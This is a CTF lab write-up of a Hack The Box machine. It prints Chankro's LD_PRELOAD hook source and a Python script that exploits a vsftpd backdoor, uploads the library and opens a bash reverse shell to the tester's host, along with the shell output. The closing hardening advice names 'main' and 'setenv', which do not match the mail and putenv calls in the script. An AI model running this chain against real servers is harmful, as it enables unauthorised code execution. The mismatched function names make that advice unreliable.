# Bypassing PHP disable_functions with Chankro

[ctf](/tags#ctf ) [hackthebox](/tags#hackthebox ) [htb-
lacasadepapel](/tags#htb-lacasadepapel ) [chankro](/tags#chankro )
[php](/tags#php ) [php-disable-functions](/tags#php-disable-functions ) [htb-
hackback](/tags#htb-hackback )  
  
Aug 2, 2019

  * [LaCasaDePapel Writeup](/2019/07/27/htb-lacasadepapel.html)
  * Chankro

![](https://0xdfimages.gitlab.io/img/chankro-cover.png)I was reading [Alamot’s
LaCasaDePapel
writeup](https://alamot.github.io/lacasadepapel_writeup/#getting-dali-shell-
by-escaping-php-restrictions), and they went a different way once they got the
php shell. Instead of just using the php functions to find the certificate and
key needed to read the private members https page, Alamot uses Chankro to
bypass the disabled execution functions and run arbitrary code anyway. I had
to try it.

## Background

[Chankro](https://github.com/TarlogicSecurity/Chankro) is a tool for bypassing
`disable_functions` in php to get execution anyway. It is common for content
owners to set up php with `disable_functions` set to prevent `system`,
`shell`, etc. That, in theory, prevents an attacker who finds a way to run
arbitrary php code (file upload + local file include, for example) from
getting command execution on the host.

On Linux hosts, when the php function `mail` is called, it invokes the binary
`sendmail`. The idea with Chankro is to set the `LD_PRELOAD` environment
variable to include a shared library and then call `mail`, and the shared
library will get execution.

`hook.c`, which compiles to`hook32.so` and `hook64.so` is pretty simple:

    
    
    #define  _GNU_SOURCE
    #include <stdlib.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <signal.h>
    #include <unistd.h>
    
    
    void pwn(void) {
    	chmod(getenv("CHANKRO"), 00777);
            system(getenv("CHANKRO"));
    }
    
    void daemonize(void) {
    	signal(SIGHUP, SIG_IGN);
    	if (fork() != 0) {
    		exit(EXIT_SUCCESS);
    	}
    }
    
    __attribute__ ((__constructor__)) void preloadme(void) {
      unsetenv("LD_PRELOAD");
      daemonize();
      pwn();
    }
    

It basically cleans up the `LD_PRELOAD` environment variable and then gets the
name of a binary from the `CHANKRO` environment variable, changes the
permissions to 777, and calls it with `system`.

There is a python script in the repo to run it, but for these use cases, the
more useful path is four steps:

  1. Upload the `.so` file and a file to execute (shell script or elf).
  2. Set the environment variable `LD_PRELOAD` to point to the `.so`.
  3. Set the environment variable `CHANKRO` to point to the file to execute.
  4. Run `main('a','a','a','a');` in php.

That will result in execution of the script.

## LaCasaDePapel

The biggest challenge here is to get the `.so` file uploaded to target. I was
unable to get it to work using base64 and `file_put_contents`, as it’s too
big. So I opted to go the same route as Alamot and script it. I took my
generic
[vsftpd_backdoor.py](https://gitlab.com/0xdf/ctfscripts/blob/master/vsftpd2.3.4-backdoor/vsftpd_backdoor.py)
and modified it to upload and trigger Chankro. This code is pretty sloppy, but
I just threw it together for testing purposes:

    
    
    #!/usr/bin/env python
    
    import sys
    import time
    from pwn import *
    
    if len(sys.argv) < 2:
        print("%s [ip] [port = 21]" % sys.argv[0])
        print("port defaults to 21 if not given")
        sys.exit()
    elif len(sys.argv) == 2:
        port = 21
    else:
        port = int(sys.argv[2])
    target = sys.argv[1]
    
    print("[*] Connecting to %s:%d" % (target, port))
    ftp = remote(target, port)
    ftp.sendline(b'USER 0xdf:)')
    ftp.sendline(b'PASS 0xdf')
    time.sleep(2)
    ftp.close()
    print('[+] Backdoor triggered')
    print('[*] Connecting')
    
    try:
        psy = remote(target, 6200)
    except KeyboardInterrupt:
        print("[!] Exiting Shell")
        exit(1)
    
    print("[*] Uploading chankro.so")
    psy.sendline("$f = fopen('/tmp/chankro.so', 'w');")
    with open('/opt/Chankro/hook64.so', 'rb') as f:
        while True:
            d = f.read(1024)
            if not d:
                break
            psy.sendline("fwrite($f, base64_decode('%s'));" % base64.b64encode(d))
    
    psy.sendline("fclose($f)")
    print("[+] Uploaded chankro.so")
    shell = base64.b64encode("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'")
    psy.sendline("file_put_contents('/tmp/acpid.socket', base64_decode('%s'))" % shell)
    print("[+] Uploaded shell as /tmp/acpid.socket")
    psy.sendline("putenv('CHANKRO=/tmp/acpid.socket');")
    psy.sendline("putenv('LD_PRELOAD=/tmp/chankro.so');")
    print("[+] Set env variables")
    print("[*] Triggering with mail call\n[*] Waiting for shell. This could take a minute.")
    psy.sendline("mail('a','a','a','a');")
    psy.close()
    
    dali = listen(443).wait_for_connection()
    dali.interactive()
    

When I run this, I get a shell back as dali:

    
    
    root@kali# ./lacasadepapel_dali_shell.py 10.10.10.131
    [*] Connecting to 10.10.10.131:21
    [+] Opening connection to 10.10.10.131 on port 21: Done
    [*] Closed connection to 10.10.10.131 port 21
    [+] Backdoor triggered
    [*] Connecting
    [+] Opening connection to 10.10.10.131 on port 6200: Done
    [*] Uploading chankro.so
    [+] Uploaded chankro.so
    [+] Uploaded shell as /tmp/acpid.socket
    [+] Set env variables
    [*] Triggering with mail call
    [*] Waiting for shell. This could take a minute.
    [*] Closed connection to 10.10.10.131 port 6200
    [+] Trying to bind to 0.0.0.0 on port 443: Done
    [+] Waiting for connections on 0.0.0.0:443: Got connection from 10.10.10.131 on port 37892
    [*] Switching to interactive mode
    bash: cannot set terminal process group (3121): Not a tty
    bash: no job control in this shell
    bash-4.4$ $ id
    id
    uid=1000(dali) gid=1000(dali) groups=1000(dali)
    

## Conclusion

My mind immediately went to [HackBack](/2019/07/06/htb-hackback.html#php-log-
poisoning) when I saw this technique, as it would have allowed me to get a
shell I was not able to get ([in a solid way](/2019/07/06/htb-
hackback.html#aspx-webshell)) before. However, I quickly realized HackBack is
a Windows box, so the technique doesn’t at all apply. I can upload files, but
calling mail will do something different, and there’s no `LD_PRELOAD` in
Windows, at least not in a way I can interact with at this point. It would be
an interesting area of research to see if there are ways to bypass
`disable_functions` on Windows.

Still, for Linux boxes, this is a really cool way to get around a common
protection. As an administrator, it’s probably best to add both `main` and
`setenv` to the `disable_functions` list, as either would prevent this attack.

[« LaCasaDePapel Writeup](/2019/07/27/htb-lacasadepapel.html)

[](/2019/08/02/bypassing-php-disable_functions-with-chankro.html)

